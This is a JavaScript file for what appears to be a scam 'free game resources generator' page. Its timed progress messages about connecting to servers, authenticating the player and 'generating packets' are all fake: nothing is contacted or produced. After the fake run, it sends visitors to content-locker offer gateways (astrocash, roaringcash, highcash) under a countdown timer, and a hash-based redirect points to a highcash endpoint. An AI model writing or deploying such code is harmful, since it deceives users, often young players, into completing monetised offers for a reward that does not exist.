$(document).ready(function() {
    function checkCountry() {
        $.ajax({
            url: "http://freegeoip.net/json/",
            dataType: 'json',
            type: 'GET'
        }).success(function(data) {
            country = data.country_name;

            
        });
    }

    function makeSeconds(seconds) {
        return seconds * 1000;
    }

    function round(n, k) {
        var factor = Math.pow(10, k);
        return Math.round(n*factor)/factor;
    }

	if(window.location.hash) {
		var hash = window.location.hash.substring(1); //Puts hash in variable, and removes the # character
		var res = hash.split(";");
		window.location = 'https://api.highcash.org/v2/morannon/select/' + res[1] + '/' + res[0] ;
	}



        function closeGatewayACAPI(){
            document.body.removeChild(overlayDiv);document.body.removeChild(iframeBox);
            return false;
        }

        function listenClose(event) {
            if(event.data=='closenow') { closeGatewayACAPI(); }
        }

        if(window.addEventListener) {
            addEventListener("message",listenClose,false)
        } else {
            attachEvent("onmessage",listenClose)
        }

        window.open2=function(a){window.open(a,'_blank');
    }
    //Gateways end

    var showLogs = true;
    var appSpeed = 0.5;
    var itemsCount = itemsData.length;
    var addTime = 0;

    var loadingTexts = [
        { text: 'Loading', timeout: 0 },
        { text: 'Preparation', timeout: 3 },
        { text: 'Connecting to server', timeout: 5 },
        { text: 'Loading', timeout: 7 },
        { text: 'Checking', timeout: 9 },
        { text: 'Preparation', timeout: 12 },
        { text: 'Checking player', timeout: 17 },
        { text: 'Player valid', timeout: 20 },
        { text: 'Player authentication', timeout: 22 },
        { text: 'Attempting connection', timeout: 26 },
        { text: 'Connected', timeout: 29 },
        { text: 'Loading modul 0/20', timeout: 30 },
        { text: 'Loading modul 1/20', timeout: 31 },
        { text: 'Loading modul 2/20', timeout: 32 },
        { text: 'Loading modul 3/20', timeout: 33 },
        { text: 'Loading modul 4/20', timeout: 34 },
        { text: 'Loading modul 5/20', timeout: 35 },
        { text: 'Loading modul 6/20', timeout: 36 },
        { text: 'Loading modul 7/20', timeout: 37 },
        { text: 'Loading modul 8/20', timeout: 38 },
        { text: 'Loading modul 9/20', timeout: 39 },
        { text: 'Loading modul 10/20', timeout: 40 },
        { text: 'Loading modul 11/20', timeout: 41 },
        { text: 'Loading modul 12/20', timeout: 42 },
        { text: 'Loading modul 13/20', timeout: 43 },
        { text: 'Loading modul 14/20', timeout: 44 },
        { text: 'Loading modul 15/20', timeout: 45 },
        { text: 'Loading modul 16/20', timeout: 46 },
        { text: 'Loading modul 17/20', timeout: 47 },
        { text: 'Loading modul 18/20', timeout: 48 },
        { text: 'Loading modul 19/20', timeout: 49 },
        { text: 'Loading modul 20/20', timeout: 50 },
        { text: 'Loading', timeout: 51 },
        { text: 'Waiting for server', timeout: 54 }
    ];

    if (itemsCount >= 1) {
        loadingTexts.push({ text: 'Generating packets for ' + itemsData[0].name, timeout: 57 });
        loadingTexts.push({ text: 'Generating successfully', timeout: 61 });
    }

    if (itemsCount >= 2) {
        loadingTexts.push({ text: 'Generating packets for ' + itemsData[1].name, timeout: 62 });
        loadingTexts.push({ text: 'Generating successfully', timeout: 66 });
        var addTime = 1 * 8;
    }

    if (itemsCount >= 3) {
        loadingTexts.push({ text: 'Generating packets for ' + itemsData[2].name, timeout: 67 });
        loadingTexts.push({ text: 'Generating successfully', timeout: 71 });
        var addTime = 2 * 8;
    }

    if (itemsCount >= 4) {
        loadingTexts.push({ text: 'Generating packets for ' + itemsData[3].name, timeout: 72 });
        loadingTexts.push({ text: 'Generating successfully', timeout: 76 });
        var addTime = 3 * 8;
    }

    loadingTexts.push({ text: 'Optimization', timeout: 63 + addTime });
    loadingTexts.push({ text: 'Loading', timeout: 65 + addTime });


    itemsData.forEach(function(item, index, array) {
        var appendHtml = '';
            appendHtml += '<div class="resource" data-item-id="' + (index + 1) + '">';
                appendHtml += '<div class="title">' + item.name + '</div>';
                appendHtml += '<div class="bottom_inputs">';
                    appendHtml += '<div class="btn btn-minus" data-item-id="' + (index + 1) + '">-</div>';
                    appendHtml += '<div class="value_box">';
                        appendHtml += '<div class="icon"><img src="img/res/' + item.img + '" alt="res"></div>';
                        appendHtml += '<div class="value">' + item.min + '</div>';
                    appendHtml += '</div>';
                    appendHtml += '<div class="btn btn-plus" data-item-id="' + (index + 1) + '">+</div>';
                appendHtml += '</div>';
            appendHtml += '</div>';

        $('#resources').append(appendHtml);
    });

    //App
    $('.view[data-id=1]').show();

    $('#resources .resource .btn').on('click', function() {
        var itemId = parseInt($(this).attr('data-item-id'));
        var resourceMinValue = itemsData[itemId - 1].min;
        var resourceMaxValue = itemsData[itemId - 1].max;
        var resourceStepValue = itemsData[itemId - 1].step;

        var currentValue = parseInt($('#resources .resource[data-item-id=' + itemId + '] .value_box .value').text());
        var checkPlusClass = $(this).hasClass('btn-plus');

        if (checkPlusClass) {
            var newValue = currentValue + resourceStepValue;

            if (newValue <= resourceMaxValue) {
                $('#resources .resource[data-item-id=' + itemId + '] .value_box .value').text(newValue);
            }
        } else {
            var newValue = currentValue - resourceStepValue;

            if (newValue >= resourceMinValue) {
                $('#resources .resource[data-item-id=' + itemId + '] .value_box .value').text(newValue);
            }
        }

        return false;
    });

    $('#generate_button').click(function() {
        $('#popup').show();

        return false;
    });

    //Popup
    $('#popup #popup_close_btn').click(function() {
        $('#popup').hide();

        return false;
    });

    $('#popup #continue_button').click(function() {
        var playerTagValue = $('#popup #playerTag').val();

        if (playerTagValue != '') {
            $('#popup').hide();
            $('.view[data-id=1]').hide();
            $('.view[data-id=2]').show();

            loadingTexts.forEach(function(item, index, array) {
                setTimeout(function() {
                    $('#progressbar_text').html(item.text);

                    var percentProgressbar = (100 / loadingTexts.length) * (index + 1);
                        percentProgressbar = round(percentProgressbar, 2);

                        console.log(percentProgressbar);

                    $('#progressbar .progress').animate({
                        width: percentProgressbar + '%'
                    }, makeSeconds(0.1) * appSpeed);
                }, makeSeconds(item.timeout) * appSpeed);
            });

            setTimeout(function() {
                $('#loader').hide();
                $('#resources_final').show();

                itemsData.forEach(function(item, index, array) {
                    var timeoutFinalResource = (index + 1) * 4;

                    setTimeout(function() {
                        var getItemValue = $('#resources .resource[data-item-id=' + (index + 1) + '] .value_box .value').text();

                        var appendHtml = '';
                            appendHtml += '<div class="resource" data-item-id="' + (index + 1) + '">';
                                appendHtml += '<div class="icon"><img src="img/res/' + item.img + '" alt="res"></div>';
                                appendHtml += '<div class="right_side">';
                                    appendHtml += '<div class="title">' + item.name + '</div>';
                                    appendHtml += '<div class="value">...</div>';
                                appendHtml += '</div>';
                            appendHtml += '</div>';

                        $('#resources_final').append(appendHtml);
                    }, makeSeconds(timeoutFinalResource) * appSpeed);
                });
            }, makeSeconds(29) * appSpeed);

            setTimeout(function() {
                $('#loader').hide();
                $('#searching_player').text('Searching for player "' + $('#popup #playerTag').val() + '"').show();
            }, makeSeconds(17) * appSpeed);

            setTimeout(function() {
                $('#loader').show();
                $('#searching_player').hide();
            }, makeSeconds(22) * appSpeed);

            if (itemsCount >= 1) {
                setTimeout(function() { $('#resources_final .resource[data-item-id=1] .value').text('Initializing...'); }, makeSeconds(57) * appSpeed);
                setTimeout(function() { $('#resources_final .resource[data-item-id=1] .value').text('Generating...'); }, makeSeconds(58) * appSpeed);
                setTimeout(function() {
                    var getItemValue = $('#resources .resource[data-item-id=1] .value_box .value').text();
                    $('#resources_final .resource[data-item-id=1] .value').text(getItemValue);
                }, makeSeconds(61) * appSpeed);
            }

            if (itemsCount >= 2) {
                setTimeout(function() { $('#resources_final .resource[data-item-id=2] .value').text('Initializing...'); }, makeSeconds(62) * appSpeed);
                setTimeout(function() { $('#resources_final .resource[data-item-id=2] .value').text('Generating...'); }, makeSeconds(63) * appSpeed);
                setTimeout(function() {
                    var getItemValue = $('#resources .resource[data-item-id=2] .value_box .value').text();
                    $('#resources_final .resource[data-item-id=2] .value').text(getItemValue);
                }, makeSeconds(66) * appSpeed);
            }

            if (itemsCount >= 3) {
                setTimeout(function() { $('#resources_final .resource[data-item-id=3] .value').text('Initializing...'); }, makeSeconds(67) * appSpeed);
                setTimeout(function() { $('#resources_final .resource[data-item-id=3] .value').text('Generating...'); }, makeSeconds(68) * appSpeed);
                setTimeout(function() {
                    var getItemValue = $('#resources .resource[data-item-id=3] .value_box .value').text();
                    $('#resources_final .resource[data-item-id=3] .value').text(getItemValue);
                }, makeSeconds(71) * appSpeed);
            }

            if (itemsCount >= 4) {
                setTimeout(function() { $('#resources_final .resource[data-item-id=4] .value').text('Initializing...'); }, makeSeconds(72) * appSpeed);
                setTimeout(function() { $('#resources_final .resource[data-item-id=4] .value').text('Generating...'); }, makeSeconds(73) * appSpeed);
                setTimeout(function() {
                    var getItemValue = $('#resources .resource[data-item-id=4] .value_box .value').text();
                    $('#resources_final .resource[data-item-id=4] .value').text(getItemValue);
                }, makeSeconds(76) * appSpeed);
            }

            setTimeout(function() {
                $('#resources_final').addClass('short');
                $('#progressbar').hide();
                $('#progressbar_text').hide();
                $('#verify_button').show();
                $('#welcome_text.two').show();
                $('#tip_text.two').show();
            }, makeSeconds(67 + addTime) * appSpeed);
        }

        return false;
    });

    $('#verify_button').click(function() {
        $('.view[data-id=2]').hide();
        $('.view[data-id=3]').show();

        if (showSocials == false) {
            $('#share_buttons').hide();
            $('#tip_text.three').hide();
            $('#heading_text').hide();
            $('#widget_frame').show();
            $('#security_key').show();

    		if(gatewayType == 'astrocash') {
    			show_astrocash();
    		}

    		if(gatewayType == 'roaringcash') {
    			show_roaringcash();
    		}

    		if(gatewayType == 'highcash') {
    			show_highcash();
            }
        }

        setInterval(function() {
            var minutes = parseInt($('.complete_verification_timer .minutes').text());
            var seconds = parseInt($('.complete_verification_timer .seconds').text());

            if (minutes > 0 || seconds > 0) {
                if (seconds == 0) {
                    var minutes = minutes - 1;
                    var seconds = 60;
                }

                var seconds = seconds - 1;

                $('.complete_verification_timer .minutes').text(minutes);
                $('.complete_verification_timer .seconds').text(seconds);

                console.log(minutes);
                console.log(seconds);
            }
        }, 1000);

        return false;
    });



});
